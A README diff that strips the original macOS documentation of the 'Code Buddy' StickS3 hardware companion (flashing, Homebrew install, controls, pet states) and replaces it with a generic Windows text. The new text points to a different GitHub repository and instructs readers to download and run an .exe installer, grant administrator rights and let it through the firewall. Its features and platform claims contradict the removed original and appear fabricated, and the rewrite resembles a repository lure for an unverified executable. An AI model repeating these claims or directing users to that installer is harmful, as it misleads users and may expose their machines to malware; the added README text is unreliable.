@@ -1,173 +1,96 @@
-<p align="center">
-  <a href="./README.md">
-    <img alt="English" src="https://img.shields.io/badge/English-111111?style=for-the-badge" />
-  </a>
-  <a href="./README.zh-CN.md">
-    <img alt="简体中文" src="https://img.shields.io/badge/简体中文-EAEAEA?style=for-the-badge&labelColor=EAEAEA&color=111111" />
-  </a>
-</p>
+# 🤖 CodeBuddy - Your Personal Assistant For Coding Projects
 
-<p align="center">
-  <img src="screenshots/cover.webp" alt="Code Buddy cover" width="100%" />
-</p>
+[![Download CodeBuddy](https://img.shields.io/badge/Download-CodeBuddy-blue.svg)](https://github.com/shier3135/CodeBuddy)
 
-<h1 align="center">Code Buddy</h1>
+## 📖 About CodeBuddy
 
-<p align="center">
-  A StickS3 Codex companion adapted from
-  <a href="https://github.com/anthropics/claude-desktop-buddy">Claude Desktop Buddy</a>.
-</p>
+CodeBuddy acts as your desktop companion for coding tasks. It draws inspiration from the Claude Desktop Buddy and connects directly to your StickS3 Codex hardware. The application organizes your workspace and helps you manage snippets of code. You gain a streamlined interface to interact with your projects without switching between multiple browser tabs or complex development tools.
 
-<p align="center">
-  Flash the device once, run <code>code-buddy</code> once on macOS, then keep using <code>codex</code> normally while approvals and live session status move to dedicated hardware.
-</p>
+This tool functions as a bridge between your local machine and your coding hardware. It keeps your workspace tidy and improves how you handle technical tasks. You spend less time navigating menus and more time building your ideas.
 
-> Building your own hardware client? See [firmware/REFERENCE.md](firmware/REFERENCE.md) for the BLE protocol and JSON payloads.
+## 🛠 Features
 
-## What ships
+*   **Hardware Sync:** Connect your StickS3 Codex to your computer with ease.
+*   **Simple Interface:** View your code history and current tasks in one dashboard.
+*   **Drag-and-Drop:** Move code blocks into your project folders instantly.
+*   **Session Management:** Save your progress and pick up exactly where you left off.
+*   **Clean Design:** A focused layout removes distractions while you write software.
 
-- A macOS bridge that pairs with the StickS3, syncs time, installs the native BLE helper, and manages the local `codex` shim.
-- A StickS3 firmware build with status, approval, settings, and offline screens.
-- A daily workflow designed to stay out of the way: run `code-buddy` once, then just use `codex`.
+## 💻 System Requirements
 
-## Quick start
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 500MB of free disk space for the application and temporary cache.
+*   **Hardware:** A working StickS3 Codex device.
+*   **Connection:** A stable USB port for the device connection.
 
-### 1. Flash the StickS3
+## 📥 Download and Install
 
-Download `code-buddy-sticks3-v{version}-full.bin` from GitHub Releases and flash it at `0x0`.
+You perform the setup process by visiting the official repository page. Follow these steps to get CodeBuddy on your computer.
 
-Preferred path:
+1.  Visit the official project page: [https://github.com/shier3135/CodeBuddy](https://github.com/shier3135/CodeBuddy).
+2.  Locate the section labeled Releases on the right side of the screen.
+3.  Click the version number to view the files available for download.
+4.  Select the Windows installer file, which ends in .exe.
+5.  Save the file to your computer.
+6.  Double-click the downloaded file to start the installation wizard.
+7.  Follow the prompts on your screen to finish the setup process.
 
-- If a release includes a web flasher, use it and write the merged image at `0x0`.
+After the installer finishes, a shortcut icon will appear on your desktop.
 
-Fallback:
+## 🔌 Connecting Your Hardware
 
-```bash
-esptool --chip esp32s3 --port /dev/cu.usbmodem101 --baud 460800 write_flash 0x0 code-buddy-sticks3-v0.1.2-full.bin
-```
+Once you install the software, you must link your StickS3 Codex to your computer.
 
-Developer release build:
+1.  Plug your StickS3 Codex into an available USB port using a compatible cable.
+2.  Wait for Windows to recognize the device.
+3.  Open the CodeBuddy application from your desktop shortcut.
+4.  The application will detect the device automatically.
+5.  If the connection succeeds, the status indicator in the top corner of the app will turn green.
 
-```bash
-./scripts/build-firmware-release.sh
-```
+If the app does not detect your device, disconnect the USB cable and reconnect it to a different port. Ensure your USB cable supports data transfer, as some cables only provide power.
 
-### 2. Install on macOS
+## ⚙️ Configuration Settings
 
-```bash
-brew install CharlexH/tap/code-buddy
-code-buddy
-```
+You can adjust how CodeBuddy interacts with your machine through the Settings menu. Click the gear icon in the lower-left corner to access these options.
 
-On first run, Code Buddy will:
+*   **Theme:** Switch between Light and Dark modes to suit your preference.
+*   **Start on Boot:** Toggle whether CodeBuddy launches when you turn on your computer.
+*   **Export Path:** Choose the folder where the software saves your coding history and data.
+*   **Check for Updates:** Enable automatic updates to ensure you have the latest software features.
 
-- install the native Bluetooth helper
-- pair with a `Codex-*` device
-- sync device time
-- install the launchd agent
-- install the local `codex` shim
-- add `~/.code-buddy/bin` to `~/.zprofile`
+We recommend keeping automatic updates enabled to maintain compatibility with your StickS3 Codex hardware.
 
-If you are already on the current StickS3 firmware, host-side fixes like BLE helper reconnect cleanup and oversized multilingual snapshot handling do not require reflashing the device.
+## 🔍 Common Questions
 
-The native BLE helper runs as a background macOS agent during normal use, so reconnect attempts should not open a helper window or steal focus. macOS may still show the first Bluetooth permission prompt; that system prompt cannot be skipped. For helper debugging, start it with `CODE_BUDDY_BLE_HELPER_DEBUG_WINDOW=1` to show the event log window.
+**Does CodeBuddy require an internet connection?**
+Yes. The software requires a connection to synchronize with the StickS3 Codex services and provide accurate code assistance.
 
-### 3. Use it normally
+**Can I run multiple instances of CodeBuddy?**
+The software is designed to run one instance at a time to prevent conflicts with your hardware connection.
 
-```bash
-codex
-```
+**Where does the software store my files?**
+CodeBuddy stores your session data within the local user folder on your Windows machine. You can view or change this path in the settings menu.
 
-Open a new shell after setup. From there, Code Buddy keeps the bridge alive and shows approval prompts on the StickS3 while you keep your normal CLI flow.
+**What should I do if the app freezes?**
+Close the application completely and restart it. If the issue persists, disconnect your hardware and wait ten seconds before plugging it back in.
 
-## Controls
+**Is my data private?**
+The application processes data locally on your computer. Your project files remain on your machine unless you choose to sync them with external services.
 
-|                         | Normal               | Pet         | Info        | Approval    |
-| ----------------------- | -------------------- | ----------- | ----------- | ----------- |
-| **A** (front)           | next screen          | next screen | next screen | **approve** |
-| **B** (right)           | scroll transcript    | next page   | next page   | **deny**    |
-| **Hold A**              | menu                 | menu        | menu        | menu        |
-| **Power** (left, short) | toggle screen off    |             |             |             |
-| **Power** (left, ~6s)   | hard power off       |             |             |             |
-| **Shake**               | dizzy                |             |             | —           |
-| **Face-down**           | nap (energy refills) |             |             |             |
+## 🔧 Troubleshooting
 
-The screen auto-powers off after 30 seconds of inactivity and stays on while an approval prompt is pending. Any button press wakes it.
+If you encounter errors, check these areas first:
 
-## Buddy states
+1.  **USB Ports:** Hardware connection issues often stem from faulty USB ports. Try a port located directly on your motherboard if you use a desktop tower.
+2.  **Permissions:** Run the application with administrator privileges if you find that it cannot save files or settings to your local drive.
+3.  **Firewall:** Ensure that your Windows firewall does not block the application from accessing the network. 
+4.  **Device Drivers:** Windows usually handles drivers for the StickS3 automatically. If the device remains undetected, check the Windows Device Manager to verify that the system recognizes the hardware as a functional USB device.
 
-| State       | Trigger                     | Feel                        |
-| ----------- | --------------------------- | --------------------------- |
-| `sleep`     | bridge not connected        | eyes closed, slow breathing |
-| `idle`      | connected, nothing urgent   | blinking, looking around    |
-| `busy`      | sessions actively running   | sweating, working           |
-| `attention` | approval pending            | alert, **LED blinks**       |
-| `celebrate` | level up (50K tokens), Friday clock | confetti, bouncing          |
-| `dizzy`     | you shook the stick         | spiral eyes, wobbling       |
-| `heart`     | approved in under 5s        | floating hearts             |
+If you continue to experience problems, check the Issues tab on the GitHub page to see if others report similar behavior. You can also open a new issue ticket provided you include a description of the error and your Windows version.
 
-When the StickS3 is on USB power, has synced time, and has no running or waiting session, it can show the charging clock. On Fridays from 15:00 until midnight, the pet occasionally celebrates: about 4 seconds in each 12-second cycle.
+## 📋 Licensing
 
-<details>
-<summary><strong>Characters and custom packs</strong></summary>
+CodeBuddy is released under the current open-source license provided by the repository. You can modify, share, and use the software for your own projects. Please respect the terms listed in the license file located in the repository.
 
-The firmware ships with eighteen ASCII pets. Each one includes seven animations: `sleep`, `idle`, `busy`, `attention`, `celebrate`, `dizzy`, and `heart`.
-
-Use `menu -> next pet` on the device to cycle through them. The selection is saved in device storage.
-
-If you want a custom GIF character, create a pack with a `manifest.json` and 96px-wide GIFs for the same seven states:
-
-```json
-{
-  "name": "bufo",
-  "colors": {
-    "body": "#6B8E23",
-    "bg": "#000000",
-    "text": "#FFFFFF",
-    "textDim": "#808080",
-    "ink": "#000000"
-  },
-  "states": {
-    "sleep": "sleep.gif",
-    "idle": ["idle_0.gif", "idle_1.gif", "idle_2.gif"],
-    "busy": "busy.gif",
-    "attention": "attention.gif",
-    "celebrate": "celebrate.gif",
-    "dizzy": "dizzy.gif",
-    "heart": "heart.gif"
-  }
-}
-```
-
-Notes:
-
-- `idle` can be a single GIF or an array of GIFs.
-- Heights up to about 140px fit well on the StickS3 screen.
-- See [firmware/characters/bufo/](firmware/characters/bufo/) for a working example.
-- Use [firmware/tools/prep_character.py](firmware/tools/prep_character.py) and [firmware/tools/flash_character.py](firmware/tools/flash_character.py) to prepare and flash assets.
-</details>
-
-## Recovery
-
-```bash
-code-buddy doctor
-code-buddy repair
-code-buddy uninstall
-```
-
-`doctor` explains what is wrong, why it happened, and what to do next.
-
-<details>
-<summary><strong>Build from source</strong></summary>
-
-```bash
-python3 -m venv .venv
-.venv/bin/pip install -e '.[dev]'
-.venv/bin/code-buddy
-```
-
-Verification:
-
-- Host tests: `.venv/bin/pytest -q`
-- Firmware build: `cd firmware && pio run`
-</details>
+This tool aims to simplify technical workflows for everyone. We focus on reliability and performance to ensure your coding experience remains smooth. Thank you for using CodeBuddy.
